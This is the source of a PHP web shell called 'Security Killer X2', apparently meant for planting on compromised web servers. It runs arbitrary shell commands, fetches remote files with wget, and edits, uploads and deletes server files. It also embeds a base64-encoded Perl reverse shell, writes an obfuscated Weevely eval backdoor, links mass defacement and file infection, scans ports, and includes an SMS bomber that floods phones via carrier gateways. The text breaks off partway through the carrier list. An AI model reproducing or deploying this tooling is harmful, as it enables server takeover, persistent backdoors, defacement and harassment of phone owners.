<html>
<LINK rel="SHORTCUT ICON" href="http://upload.wikimedia.org/wikipedia/commons/thumb/9/90/National_emblem_of_Indonesia_Garuda_Pancasila.svg/85px-National_emblem_of_Indonesia_Garuda_Pancasila.svg.png">
<body>
<?php


 $head = '
<html>
<head>
</script>
<title>Security Killer ++</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
	background-image: url(http://indocyberattacker.org/background.gif);
	background-repeat: repeat-x repeat-y;
	background-position: left top;
	font-size: 14px;
	background-attachment: fixed;
font-family: sans;
color: red;
margin:0px 0px 0px 0px;
}
font-family: Courier New
}
tr {
BORDER: line 1px #333;
color: #FFF;
}
td {
BORDER: line 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: line 1px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border			: line 1px;
border-color		: #333;
BACKGROUND-COLOR: #111111;
font: 9pt Verdana;
color: Red;
}
select {
BORDER-RIGHT:  Black 1px solid;
BORDER-TOP:    #DF0000 1px solid;
BORDER-LEFT:   #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: #111111;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: #111111;
width: 30%;
color: #FFF;
}
textarea {
border			: line 1px #333;
BACKGROUND-COLOR: #111111;
font: Fixedsys bold;
color: #999;
}
BODY {
	SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: #111111;
}
.main {
margin			: -287px 0px 0px -490px;
BORDER: line 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: transparent;
}

A:link {
	COLOR: White; TEXT-DECORATION: none
}
A:visited {
	COLOR: White; TEXT-DECORATION: none
}
A:hover {
	color: Red; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>'; ?>
<?php
error_reporting(0);
#chdir('');
//Some basic var's
if (!@$_GET['path']) {
    $dir = CleanDir(getcwd());
} else {
    $dir = CleanDir($_GET['path']);
}
$rootdir = CleanDir($_SERVER['DOCUMENT_ROOT']);
$domain = $_SERVER['HTTP_HOST'];
$script = $_SERVER['SCRIPT_NAME'];
$full_url = $_SERVER['REQUEST_URI'];
$script2 = basename($script);
$serverip = $_SERVER['SERVER_ADDR'];
$userip = $_SERVER['REMOTE_ADDR'];
$whoami = function_exists("posix_getpwuid") ? posix_getpwuid(posix_geteuid()) : exec("whoami");
$whoami = function_exists("posix_getpwuid") ? $whoami['name'] : exec("whoami");
$disabled = ini_get('disable_functions');
//Perl back connect script by LorD
//Encoded in base64 for convenience
$bcperl_source = "IyEvdXNyL2Jpbi9wZXJsIA0KdXNlIElPOjpTb2NrZXQ7IA0KIyAgIFByaXY4ICoqIFByaXY4ICoqIFByaXY4IA0KIyBJUkFOIEhBQ0tFUlMgU0FCT1RBR0UgQ29ubmVjdCBCYWNrIFNoZWxsICAgICAgICAgIA0KIyBjb2RlIGJ5OkxvckQgDQojIFdlIEFyZSA6TG9yRC1DMGQzci1OVC1ceDkwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiMgRW1haWw6TG9yREBpaHN0ZWFtLmNvbSANCiMgDQojbG9yZEBTbGFja3dhcmVMaW51eDovaG9tZS9wcm9ncmFtaW5nJCBwZXJsIGRjLnBsIA0KIy0tPT0gQ29ubmVjdEJhY2sgQmFja2Rvb3IgU2hlbGwgdnMgMS4wIGJ5IExvckQgb2YgSVJBTiBIQUNLRVJTIFNBQk9UQUdFID09LS0gDQojIA0KI1VzYWdlOiBkYy5wbCBbSG9zdF0gW1BvcnRdIA0KIyANCiNFeDogZGMucGwgMTI3LjAuMC4xIDIxMjEgDQojbG9yZEBTbGFja3dhcmVMaW51eDovaG9tZS9wcm9ncmFtaW5nJCBwZXJsIGRjLnBsIDEyNy4wLjAuMSAyMTIxIA0KIy0tPT0gQ29ubmVjdEJhY2sgQmFja2Rvb3IgU2hlbGwgdnMgMS4wIGJ5IExvckQgb2YgSVJBTiBIQUNLRVJTIFNBQk9UQUdFID09LS0gDQojIA0KI1sqXSBSZXNvbHZpbmcgSG9zdE5hbWUgDQojWypdIENvbm5lY3RpbmcuLi4gMTI3LjAuMC4xIA0KI1sqXSBTcGF3bmluZyBTaGVsbCANCiNbKl0gQ29ubmVjdGVkIHRvIHJlbW90ZSBob3N0IA0KDQojYmFzaC0yLjA1YiMgbmMgLXZ2IC1sIC1wIDIxMjEgDQojbGlzdGVuaW5nIG9uIFthbnldIDIxMjEgLi4uIA0KI2Nvbm5lY3QgdG8gWzEyNy4wLjAuMV0gZnJvbSBsb2NhbGhvc3QgWzEyNy4wLjAuMV0gMzI3NjkgDQojLS09PSBDb25uZWN0QmFjayBCYWNrZG9vciB2cyAxLjAgYnkgTG9yRCBvZiBJUkFOIEhBQ0tFUlMgU0FCT1RBR0UgPT0tLSANCiMgDQojLS09PVN5c3RlbWluZm89PS0tIA0KI0xpbnV4IFNsYWNrd2FyZUxpbnV4IDIuNi43ICMxIFNNUCBUaHUgRGVjIDIzIDAwOjA1OjM5IElSVCAyMDA0IGk2ODYgdW5rbm93biB1bmtub3duIEdOVS9MaW51eCANCiMgDQojLS09PVVzZXJpbmZvPT0tLSANCiN1aWQ9MTAwMShsb3JkKSBnaWQ9MTAwKHVzZXJzKSBncm91cHM9MTAwKHVzZXJzKSANCiMgDQojLS09PURpcmVjdG9yeT09LS0gDQojL3Jvb3QgDQojIA0KIy0tPT1TaGVsbD09LS0gDQojIA0KJHN5c3RlbSAgID0gJy9iaW4vYmFzaCc7IA0KJEFSR0M9QEFSR1Y7IA0KcHJpbnQgIklIUyBCQUNLLUNPTk5FQ1QgQkFDS0RPT1JcblxuIjsgDQppZiAoJEFSR0MhPTIpIHsgDQogICBwcmludCAiVXNhZ2U6ICQwIFtIb3N0XSBbUG9ydF0gXG5cbiI7IA0KICAgZGllICJFeDogJDAgMTI3LjAuMC4xIDIxMjEgXG4iOyANCn0gDQp1c2UgU29ja2V0OyANCnVzZSBGaWxlSGFuZGxlOyANCnNvY2tldChTT0NLRVQsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCBnZXRwcm90b2J5bmFtZSgndGNwJykpIG9yIGRpZSBwcmludCAiWy1dIFVuYWJsZSB0byBSZXNvbHZlIEhvc3RcbiI7IA0KY29ubmVjdChTT0NLRVQsIHNvY2thZGRyX2luKCRBUkdWWzFdLCBpbmV0X2F0b24oJEFSR1ZbMF0pKSkgb3IgZGllIHByaW50ICJbLV0gVW5hYmxlIHRvIENvbm5lY3QgSG9zdFxuIjsgDQpwcmludCAiWypdIFJlc29sdmluZyBIb3N0TmFtZVxuIjsgDQpwcmludCAiWypdIENvbm5lY3RpbmcuLi4gJEFSR1ZbMF0gXG4iOyANCnByaW50ICJbKl0gU3Bhd25pbmcgU2hlbGwgXG4iOyANCnByaW50ICJbKl0gQ29ubmVjdGVkIHRvIHJlbW90ZSBob3N0IFxuIjsgDQpTT0NLRVQtPmF1dG9mbHVzaCgpOyANCm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOyANCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOyANCm9wZW4oU1RERVJSLCI+JlNPQ0tFVCIpOyANCnByaW50ICJJSFMgQkFDSy1DT05ORUNUIEJBQ0tET09SICBcblxuIjsgDQpzeXN0ZW0oInVuc2V0IEhJU1RGSUxFOyB1bnNldCBTQVZFSElTVCA7ZWNobyAtLT09U3lzdGVtaW5mbz09LS0gOyB1bmFtZSAtYTtlY2hvOyANCmVjaG8gLS09PVVzZXJpbmZvPT0tLSA7IGlkO2VjaG87ZWNobyAtLT09RGlyZWN0b3J5PT0tLSA7IHB3ZDtlY2hvOyBlY2hvIC0tPT1TaGVsbD09LS0gIik7IA0Kc3lzdGVtKCRzeXN0ZW0pOyANCiNFT0Y=";
@ini_set("memory_limit", "9999M");
@ini_set("max_execution_time", "0");
@ini_set("upload_max_filesize", "9999m");
@ini_set("magic_quotes_gpc", "0");
@set_magic_quotes_runtime(0);
set_time_limit(0);
if (empty($disabled)) {
    $disabled = "None";
}
//Some functions
function CleanDir($directory) {
    $directory = str_replace("\\", "/", $directory);
    $directory = str_replace("//", "/", $directory);
    return $directory;
}
function success($for, $var1) {
    $domain = $_SERVER['HTTP_HOST'];
    $script = $_SERVER['SCRIPT_NAME'];
    $full_url = $_SERVER['REQUEST_URI'];
    if ($for == "filesave") {
        $message = "File Saved!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "filedelete") {
        $message = "File Deleted!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "createdir") {
        $message = "Directory Created!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "dir_exists") {
        $message = "Directory Already Exists!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "file_exists") {
        $message = "File Already Exists!";
        $redirect = "http://$domain$script?editfile=$var1";
    }
    if ($for == "file_created") {
        $message = "File Created!";
        $redirect = "http://$domain$script?editfile=$var1";
    }
    if ($for == "file_uploaded") {
        $message = "File Uploaded!";
        $redirect = "http://$domain$full_url";
    }
    if ($for == "shell_killed") {
        $message = "Shell Killed!";
        $redirect = "http://$domain$script";
    }
    if ($for == "dir_del") {
        $message = "Directory Deleted!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "dir_renamed") {
        $message = "Directory Renamed!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "file_renamed") {
        $message = "File Renamed!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "configs_found") {
        $message = "$var1 Configs Found!";
        $redirect = "";
    }
    if ($for == "unzip") {
        $message = "Successfully Unzipped File!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "files_found") {
        $message = "$var1 files found!";
        $redirect = "";
    }
    if ($for == "weevely") {
        $message = "Weevely BackDoor Installed!";
        $redirect = "";
    }
    echo "<div id='xbox'><embed
   src='http://p0wersurge.com/js/achievementnopic.swf'
   width='300'
   height='80'
   flashvars='Text=$message&gs=1337'
   wmode='transparent'/></div>";
    if (empty($redirect)) {
        echo "<script>
function remove (){
 document.getElementById('xbox').innerHTML='';
}
setInterval(function(){remove();}, 2700);
</script>";
    } else {
        echo "<script>
function remove (){
 window.location = '$redirect'
}
setInterval(function(){remove();}, 2500);
</script>";
    }
}
function error($mesg) {
    $error = "<center><font size='4' color='red'><b>$mesg</b></font></center>";
    echo "$error";
}
function ByteConversion($bytes, $precision = 2) {
    $kilobyte = 1024;
    $megabyte = $kilobyte * 1024;
    $gigabyte = $megabyte * 1024;
    $terabyte = $gigabyte * 1024;
    if (($bytes >= 0) && ($bytes < $kilobyte)) {
        return $bytes . ' B';
    } elseif (($bytes >= $kilobyte) && ($bytes < $megabyte)) {
        return round($bytes / $kilobyte, $precision) . ' KB';
    } elseif (($bytes >= $megabyte) && ($bytes < $gigabyte)) {
        return round($bytes / $megabyte, $precision) . ' MB';
    } elseif (($bytes >= $gigabyte) && ($bytes < $terabyte)) {
        return round($bytes / $gigabyte, $precision) . ' GB';
    } elseif ($bytes >= $terabyte) {
        return round($bytes / $terabyte, $precision) . ' TB';
    } else {
        return $bytes . ' B';
    }
}
//Mass File Function
function files($mass_dir) {
    if ($dh = opendir($mass_dir)) {
        $files = array();
        $inner_files = array();
        while ($file = readdir($dh)) {
            if ($file != "." && $file != ".." && $file[0] != '.') {
                if (is_dir($mass_dir . "/" . $file)) {
                    $inner_files = files("$mass_dir/$file");
                    if (is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, "$mass_dir/$file");
                }
            }
        }
        closedir($dh);
        return $files;
    }
}
//Upload File
if (isset($_POST['do_upload_file'])) {
    $udir = $_POST['upload_location'];
    $uname = $_FILES['upload_file']['name'];
    $both = "$udir$uname";
    if (file_exists($both)) {
        success("file_exists", $both);
    } else {
        switch ($_FILES['upload_file']['error']) {
            case 0:
                if (@move_uploaded_file($_FILES['upload_file']['tmp_name'], $udir . '/' . $uname)) {
                    success("file_uploaded");
                } else {
                    error("Failed To Upload File!");
                }
        }
    }
}
//wget file
if (isset($_POST['do_wget_file'])) {
    $wget_file = $_POST['wget_file'];
    $wecmd = "wget $wget_file";
    $wget_ecmd = cmd2($wecmd, $dir);
    echo "<center><font color='#14ab00'>
Result:<br>
<textarea rows='20' cols='150' name='massdeface_source' style='color:#000'>
$wget_ecmd
</textarea></font></center><br><br>";
}
//Execute command
function cmd2($cmd, $path) {
    chdir($path);
    $disabled = ini_get('disable_functions');
    if (empty($disabled)) {
        $disabled = "None";
    }
    if ($disabled == "None") {
        $execute = proc_open($cmd, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
        while (!feof($io[1])) {
            $res.= htmlspecialchars(fgets($io[1]), ENT_COMPAT, 'UTF-8');
        }
        while (!feof($io[2])) {
            $res.= htmlspecialchars(fgets($io[2]), ENT_COMPAT, 'UTF-8');
        }
        fclose($io[1]);
        fclose($io[2]);
        proc_close($execute);
        return $res;
    } elseif (function_exists("proc_open")) {
        $execute = proc_open($cmd, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
        while (!feof($io[1])) {
            $res.= htmlspecialchars(fgets($io[1]), ENT_COMPAT, 'UTF-8');
        }
        while (!feof($io[2])) {
            $res.= htmlspecialchars(fgets($io[2]), ENT_COMPAT, 'UTF-8');
        }
        fclose($io[1]);
        fclose($io[2]);
        proc_close($execute);
        return $res;
    } elseif (function_exists("exec")) {
        $res = exec($cmd);
        return $res;
    } elseif (function_exists("system")) {
        $res = system($cmd);
        return $res;
    } elseif (function_exists("shell_exec")) {
        $res = shell_exec($cmd);
        return $res;
    } elseif (function_exists("passthru")) {
        $res = passthru($cmd);
        return $res;
    } else {
        error("The necessary functions to execute commands are disabled!");
    }
}
//Unzip function
function unzip($filename, $directory) {
    $zip = new ZipArchive;
    $res = $zip->open($filename);
    if ($res === TRUE) {
        $zip->extractTo($directory);
        $zip->close();
        success("unzip", $directory);
    } else {
        cmd2("unzip $filename", $directory);
    }
}
//Get files and directories and throw them into an array.
$open = opendir($dir);
$files = array();
$direcs = array();
while ($file = readdir($open)) {
    if ($file != "." && $file != "..") {
        if (is_dir("$dir/$file")) {
            array_push($direcs, $file);
        } else {
            array_push($files, $file);
        }
    }
}
asort($direcs);
asort($files);
?>
<html>
<head>
<?php 
		echo $head ;
		echo '

<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >

			


       <td width="100%" align=center valign="top" rowspan="1">
           <font color=red size=8 face="Wallpoet"><b>Security</font><font color=white size=8 face="Wallpoet"><b>  Killer</font><font color=green size=8 face="Wallpoet"><b> X2 </font> <div class="hedr"> 

        <td height="10" align="left" class="td1"></td></tr><tr><td 
        width="100%" align="center" valign="top" rowspan="1"><font 
        color="red" face="comic sans ms"size="3"><b> 
        <font color=red> 
		
		
		
        [+] We kill your security [+]
						
           </table>
		   
        

'; 

?>
<body bgcolor=black><h3 style="text-align:center"><font color=red size=2 face="comic sans ms"><div align=center><table><tr><td>Second Generation of Security Killer Shell</font><br></td></tr></table>
</head>
<p></p>
<p></p>
<body bgcolor="black"><body bgcolor="black">
<table border=1 width=100%><td width=15% align=right><font color=red size=2 face="comic sans ms">uname<br>server_ip<br>your_ip<br>server_software<br>disabled_functions</td><td><?php echo "<font size=2>".php_uname()  ;?> <br><?php echo "<font size=2>".gethostbyname($_SERVER["HTTP_HOST"]);?><br><?php echo $_SERVER['REMOTE_ADDR'];?><br><?php echo $s_software = getenv("SERVER_SOFTWARE"); ?><br><?php $r=ini_get('disable_functions') ? ini_get('disable_functions'):'none'; echo $r;?>
</table><?php echo $head ; ?><table width=100%><tr><td align=center width=60%>
</table>
<center><div id="menu">
<a href="<?php echo '?'?>"><font size=4 face="Wallpoet" color=white> [Home] </font></a>
<a href="<?php echo '?perlbackconnect';?>"><font size=4 face="Wallpoet" color=red> [Perl Back Connect] </font></a>
<a href="<?php echo '?pythonbackconnect'?>"><font size=4 face="Wallpoet" color=white> [Python Back connect] </font></a>
<a href="<?php echo '?encrypt';?>"><font size=4 face="Wallpoet" color=red> [Encrypt] </font></a>
<a href="<?php echo '?massdeface'?>"><font size=4 face="Wallpoet" color=white> [Mass Deface] </font></a>
<a href="<?php echo '?massinfect';?>"><font size=4 face="Wallpoet" color=red> [Mass File Infect] </font></a>
<a href="<?php echo '?installMySQL'?>"><font size=4 face="Wallpoet" color=white> [Install MSD] </font></a>
<p></p>
<a href="<?php echo '?sms';?>"><font size=4 face="Wallpoet" color=red> [SMS Bomber] </font></a>
<a href="<?php echo '?domaininfo'?>"><font size=4 face="Wallpoet" color=white> [Reverse IP] </font></a>
<a href="<?php echo '?weev';?>"><font size=4 face="Wallpoet" color=red> [Weevely Backdoor] </font></a>
<a href="<?php echo '?scan'?>"><font size=4 face="Wallpoet" color=white> [Port Scan] </font></a>
</div></center>
<p></p>
<p></p>
<p></p>
<?php
if (isset($_GET['encrypt'])) {
    echo "<form action='' method='post'>
<center><font color='#14ab00'>
<input type='text' name='en_string' class='text'>
<input type='submit' name='do_encrypt' value='Encrypt String'>
</form>
</font></center>";
}
if (isset($_POST['do_encrypt'])) {
    $vbsalt = gen_salt("30");
    $vbsalt2 = gen_salt("3");
    $mybbsalt = gen_salt("8");
    $ipbsalt = gen_salt("5");
    $joomlasalt = gen_salt("32");
    $password = $_POST['en_string'];
    $md5 = md5($password);
    $md52 = md5(md5($password));
    $md53 = md5(md5(md5($password)));
    $sha1 = sha1($password);
    $sha256 = hash('sha256', $password);
    $vbalg = md5(md5($password) . $vbsalt);
    $vbalg2 = md5(md5($password) . $vbsalt2);
    $mybbalg = md5(md5($mybbsalt) . $password);
    $ipbalg = md5(md5($ipbsalt) . md5($password));
    $joomlaalg = md5($password . $joomlasalt);
    $en_result = "Hashes for string: $password\nMD5: $md5\nmd5(md5(pass)): $md52\nmd5(md5(md5(pass))): $md53\nSHA-1: $sha1\nSHA-256: $sha256\nvBulletin 4: $vbalg:$vbsalt\nvBulletin 3: $vbalg2:$vbsalt2\nMyBB: $mybbalg:$mybbsalt\nIPB: $ipbalg:$ipbsalt\nJoomla 1.0.13+: $joomlaalg:$joomlasalt\n";
    echo "<center>
<textarea rows='20' cols='150' style='color:#00ff00'>
$en_result
</textarea>
</center><br>";
}
?>
<?php
//Port scan
if (isset($_GET['scan'])) {
    echo "<center><font color='#14ab00' size='3'>
Port Scan:<br>
<form action='' method='post'>
Host: <input type='text' name='scan_host' class='text' value='$domain'><br>
Start port: <input type='text' name='start_port' class='text' size='6'>
End port: <input type='text' name='end_port' class='text' size='7'><br>
<input type='submit' name='start_scan' value='Scan'>
</form>
</font>
</center>";
}
if (isset($_POST['start_scan'])) {
    $scanhost = $_POST['scan_host'];
    $startport = $_POST['start_port'];
    $endport = $_POST['end_port'];
    while ($startport <= $endport) {
        if (fsockopen($scanhost, $startport, $errno, $errstr, 3)) {
            echo "<font color='green' size='3'>Port $startport is open on $scanhost</font><br>";
        } else {
            echo "<font color='red' size='3'>Port $startport is not open on $scanhost</font><br>";
        }
        $startport++;
    }
}
?>
<?php
//Edit file stuff
if (!empty($_GET['editfile'])) {
    $edfile = $_GET['editfile'];
    $redirectloc = dirname($edfile);
    echo "<form method='POST'><center>";
    if (file_exists($edfile)) {
        if (get_magic_quotes_gpc()) {
            $file_content = htmlspecialchars(stripslashes(file_get_contents($edfile)));
        } else {
            $file_content = htmlspecialchars(file_get_contents($edfile));
        }
        if (is_writeable($edfile)) {
            echo "<textarea rows='20' cols='150' name='edfile_contents' style='color:#00ff00'>$file_content</textarea>
<br><br>
        <input type='submit' name='savedit' value='Save' />
        <input type='submit' name='deletefile' value='Delete' />
        </form></center>";
            if (isset($_POST['savedit'])) {
                if (get_magic_quotes_gpc()) {
                    $edfilecontent = stripslashes($_POST['edfile_contents']);
                } else {
                    $edfilecontent = $_POST['edfile_contents'];
                }
                if (file_put_contents($edfile, $edfilecontent)) {
                    success("filesave", rtrim($redirectloc, "/"));
                } else {
                    error("Failed to save file!");
                }
            } else if (isset($_POST['deletefile'])) {
                if (unlink($edfile)) {
                    success("filedelete", rtrim($redirectloc, '/'));
                } else {
                    error("Failed to delete file!");
                }
            }
        } else {
            echo "<font color='red'><b>File is read only!</b></font><br>
<textarea readonly rows='20' cols='150' name='edfile_contents'>$file_content</textarea><br><br>";
        }
        echo "</center>";
    } else {
        echo "<form method='POST'><center>";
        echo "<font color='red'><b>File does not exist!</b></font><br>
<textarea rows='20' cols='150' name='newfile_contents' style='color:#00ff00'>
</textarea><br><br>
 <input type='submit' name='savefile' value='Create File' /><br /><br />
        </form></center>";
        if (isset($_POST['savefile'])) {
            if (get_magic_quotes_gpc()) {
                $newfilecontent = stripslashes($_POST['newfile_contents']);
            } else {
                $newfilecontent = $_POST['newfile_contents'];
            }
            if (file_put_contents($edfile, $newfilecontent)) {
                success("filesave", rtrim($redirectloc, "/"));
            } else {
                error("Failed to save file!");
            }
        }
    }
}
?>
<?php
//Weevely backdoor
if (isset($_GET['weev'])) {
    echo "<center><font color='#14ab00' size='3'>
<form action='' method='post'>
Directory to install weevely backdoor:<br>
<input type='text' name='weev_dir' size='50' class='text' value='$dir'><br>
Name of file (something .php):<br>
<input type='text' name='weev_name' class='text' value='weevely.php'><br>
Password (more than 3 characters):<br>
<input type='text' name='weev_pass' class='text'><br>
<input type='submit' name='install_weev' value='BackDoor'><br>
</font>
</center>";
}
if (isset($_POST['install_weev'])) {
    $weevdir = rtrim($_POST['weev_dir'], '/');;
    $weevname = $_POST['weev_name'];
    $weevpassword = $_POST['weev_pass'];
    if (strlen($weevpassword) < 3) {
        error("Password must be longer than 3 characters!");
    } else {
        $first2 = $weevpassword[0] . $weevpassword[1];
        $rest = substr($weevpassword, 2);
        $money = "$";
        $weevelybd1 = base64_decode('ZnVuY3Rpb24gd2VldmVseSgpIHsNCiRjPSdjb3VudCc7DQokYT0kX0NPT0tJRTs=');
        $weevelybd2 = "if(reset($money" . "a)=='" . $first2 . "' && $money" . "c($money" . "a)>3) {";
        $weevelybd3 = "$money" . "k='$rest';";
        $weevelybd4 = base64_decode('ZWNobyAnPCcuJGsuJz4nOw0KZXZhbChiYXNlNjRfZGVjb2RlKHByZWdfcmVwbGFjZShhcnJheSgnL1teXHc9XHNdLycsJy9ccy8nKSwgYXJyYXkoJycsJysnKSwgam9pbihhcnJheV9zbGljZSgkYSwkYygkYSktMykpKSkpOw0KZWNobyAnPC8nLiRrLic+JzsNCn0NCn0NCndlZXZlbHkoKTs=');
        $all = "<?php\neval(base64_decode('" . base64_encode($weevelybd1 . $weevelybd2 . $weevelybd3 . $weevelybd4) . "'));\n?>";
        if (file_put_contents($weevdir . '/' . $weevname, $all)) {
            echo "<center><font color='#14ab00' size='3'>Usage: weevely [URL of backdoor] [password]</font></center><br>";
            success("weevely");
        } else {
            error("Failed to write backdoor to $weevdir");
        }
    }
}
?>
<?php
//Domain information
//Get domains hosted on server from yougetsignal.com
if (isset($_GET['domaininfo'])) {
    echo "<font color='#14ab00' size='3'>";
    $dns_record = dns_get_record($domain, DNS_ANY, $authns, $addtl);
    $num = 0;
    $count = sizeof($dns_record);
    echo "<br></b><br>";
    while ($num < $count) {
        $name_servers = $dns_record[$num];
        $name_servers2 = $name_servers['type'];
        $name_servers3 = @$name_servers['target'];
        $num++;
        if ($name_servers2 == "NS") {
            echo "$name_servers3<br>";
            $nshost = @$name_servers['host'];
        }
        if ($name_servers2 == "SOA") {
            $nsemail = $name_servers['rname'];
        }
        if ($name_servers2 == "A") {
            $nsip = $name_servers['ip'];
        }
    }
    $num = 0;
    echo "<br><table class='noborder'>
</table><br>";
    $domains_on_server = json_decode(file_get_contents("http://www.yougetsignal.com/tools/web-sites-on-web-server/php/testing.php?remoteAddress=$domain"));
    $status = $domains_on_server->status;
    $message = $domains_on_server->message;
    $domainAr = $domains_on_server->domainArray;
    $num_of_site = $domains_on_server->domainCount;
    $count = sizeof($domainAr);
    if ($status == "Success") {
        echo "Found $num_of_site sites hosted on the same server as $nshost($nsip) via <a class='navbar' href='http://www.yougetsignal.com/tools/web-sites-on-web-server/'>www.yougetsignal.com</a>:<br><br> <table class='noborder'>";
        while ($num < $count) {
            $hossites = $domainAr[$num];
            $num++;
            $hossites3 = $domainAr[$num];
            $hossites3 = $hossites3[0];
            $hossites = $hossites[0];
            $site_ips = empty($hossites) ? "" : "(" . gethostbyname($hossites) . ")";
            $site_ips2 = empty($hossites3) ? "" : "(" . gethostbyname($hossites3) . ")";
            echo "<tr><td><a class='navbar' href='http://$hossites'>$hossites</a> $site_ips</td><td><a class='navbar' href='http://$hossites3'>$hossites3</a> $site_ips2</td></tr>";
            $num++;
        }
        echo "</table><br>";
        $num = 0;
    } else {
        error("Failed to find or get sites hosted on same server from: <a class='navbar' href='http://www.yougetsignal.com/tools/web-sites-on-web-server/'>www.yougetsignal.com</a>!<br>Additional Message:<br>$message");
    }
    echo "</font><br>";
}
?>
<?php
//SMS Bomber stuff
if (isset($_POST['do_bomb_sms'])) {
    $phonenum = $_POST['phnumber'];
    $carrier = $_POST['carrier'];
    $amount = $_POST['numberof'];
    $from = $_POST['from'];
    $headers = "From: $from\r\n";
    $headers.= 'MIME-Version: 1.0' . "\n";
    $headers.= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $subject = $_POST['subject'];
    $to = "$phonenum$carrier";
    $numsent = 0;
    $sent_fail = 0;
    $sent_success = 0;
    $msgcontent = $_POST['message_content'];
    if (empty($phonenum) OR empty($amount) OR empty($from) OR empty($subject) OR empty($msgcontent)) {
        error("All Fields Must Entered!");
    } else {
        while ($numsent < $amount) {
            if (!@mail($to, $subject, $msgcontent, $headers)) {
                $numsent++;
                $sent_fail++;
            } else {
                $numsent++;
                $sent_success++;
            }
        }
        echo "<font color='#14ab00'>Successfully sent $sent_success messages.<br>
Failed to send $sent_fail messages.<br>";
    }
}
if (isset($_GET['sms'])) {
    echo "<font color='#14ab00'>
<table class='noborder'>
<tr>
<form action='' method='post'>
<td>Phone Number With Area Code</td>
<td><input type='text' name='phnumber' class='text'></td>
</tr>
<tr>
<td>Carrier:</td>
<td>
<select name='carrier'>
<option value='@sms.3rivers.net'>3 River Wireless</option>
<option value='@paging.acswireless.com'>ACS Wireless</option>
<option value='@advantagepaging.com'>Advantage Communications</option>
<option value='@airtelkk.com'>Airtel (Karnataka, India)</option>
<option value='@sms.airtelmontana.com'>Airtel Wireless (Montana, USA)</option>
<option value='@airtouch.net'>Airtouch Pagers</option>
<option value='@airtouchpaging.com'>Airtouch Pagers</option>
<option value='@alphapage.airtouch.com'>Airtouch Pagers</option>
<option value='@myairmail.com'>Airtouch Pagers</option>
<option value='@msg.acsalaska.com'>Alaska Communications Systems</option>
<option value='@message.alltel.com'>Alltel</option>
<option value='@alphanow.net'>AlphaNow</option>
<option value='@page.americanmessaging.net'>American Messaging</option>
<option value='@clearpath.acswireless.com'>Ameritech Clearpath</option>
<option value='@paging.acswireless.com'>Ameritech Paging</option>
<option value='@pageapi.com'>Ameritech Paging</option>
<option value='@airtelap.com'>Andhra Pradesh Airtel</option>
<option value='@text.aql.com'>Aql</option>
<option value='@archwireless.net'>Arch Pagers (PageNet)</option>
<option value='@epage.arch.com'>Arch Pagers (PageNet)</option>
<option value='@mobile.att.net'>AT&T</option>
<option value='@txt.att.net'>AT&T2</option>
<option value='@page.att.net'>AT&T Enterprise Paging</option>
<option value='@mmode.com'>AT&T Free2Go</option>
<option value='@mobile.att.net'>AT&T PCS</option>
<option value='@dpcs.mobile.att.net'>AT&T Pocketnet PCS</option>
<option value='@sms.beemail.ru'>BeeLine GSM</option>
<option value='@beepwear.net'>Beepwear</option>
<option value='@message.bam.com'>Bell Atlantic</option>
<option value='@bellmobility.ca'>Bell Canada</option>
<option value='@txt.bellmobility.ca'>Bell Canada2</option>
<option value='@txt.bell.ca'>Bell Mobility (Canada)</option>
<option value='@bellsouth.cl'>Bell South</option>
<option value='@blsdcs.net'>Bell South2</option>
<option value='@sms.bellsouth.com'>Bell South3</option>
<option value='@wireless.bellsouth.com'>Bell South4</option>
<option value='@bellsouthtips.com'>Bell South (Blackberry)</option>
<option value='@blsdcs.net'>Bell South Mobility</option>
<option value='@tachyonsms.co.uk'>BigRedGiant Mobile Solutions</option>
<option value='@blueskyfrog.com'>Blue Sky Frog</option>
<option value='@sms.bluecell.com'>Bluegrass Cellular</option>
<option value='@myboostmobile.com'>Boost</option>
<option value='@bplmobile.com'>BPL Mobile</option>
<option value='@@bplmobile.com'>BPL Mobile (Mumbai, India)</option>
<option value='@cmcpaging.com'>Carolina Mobile</option>
<option value='@cwwsms.com'>Carolina West Wireless</option>
<option value='@cell1.textmsg.com'>Cellular One</option>
